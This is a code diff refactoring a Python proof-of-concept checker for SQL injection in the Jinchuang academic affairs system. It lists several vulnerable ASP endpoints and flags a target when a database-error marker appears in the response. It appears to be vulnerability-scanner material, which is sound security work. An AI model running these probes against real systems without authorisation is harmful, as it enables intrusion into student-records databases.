@@ -9,14 +9,7 @@ description: 金窗教务系统多处SQL注入。
 import sys
 import requests
 import warnings
-
-
-
-class jw_multi_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['金窗教务系统存在多处SQL注射漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -27,11 +20,11 @@ class jw_multi_sqli:
                 "/jiaoshi/sj/shiyan/xuankeda.asp?bianhao=1",
                 "/jiaoshi/xueji/dangan/sdangangai1.asp?id=1",
                 "/jiaoshi/xueji/shen/autobh.asp?jh=1"]
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         noexist = True
         try:
             for turl in urls:
-                vulnurl = self.url + turl + payload
+                vulnurl = url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"GAO JI@Microsoft" in req.text:
                     result[2]=  '存在'
@@ -45,5 +38,5 @@ class jw_multi_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = jw_multi_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
